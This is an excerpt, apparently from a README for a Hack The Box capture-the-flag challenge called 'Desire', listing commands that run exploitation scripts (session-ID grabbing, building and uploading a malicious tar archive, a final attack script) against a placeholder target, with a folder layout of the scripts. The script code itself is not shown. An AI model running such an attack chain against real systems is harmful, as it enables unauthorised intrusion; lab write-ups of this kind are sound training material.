...
```bash
python3 "Desire HTB Challenge/get_session_id.py" http://target:port
```
...
```bash
python3 "Desire HTB Challenge/create_malicious_tar.py"
```
...
```bash
python3 "Desire HTB Challenge/upload_malicious_tar.py" http://target:port
```
...
```bash
python3 "Desire HTB Challenge/KO.py" http://target:port SESSION_ID_1 SESSION_ID_2 SESSION_ID_3
```
...
Located in the **`Desire HTB Challenge`** folder:
...
├── Desire HTB Challenge/              # Exploitation scripts and payloads
│   ├── KO.py
│   ├── create_malicious_tar.py
│   ├── get_session_id.py
│   └── upload_malicious_tar.py
└── 855/                               # Challenge source code
    ├── challenge/
    ├── config/
    ├── Dockerfile
    └── ...
...
**Author:** Muhammad Younas | **Date:**  December 04 2025
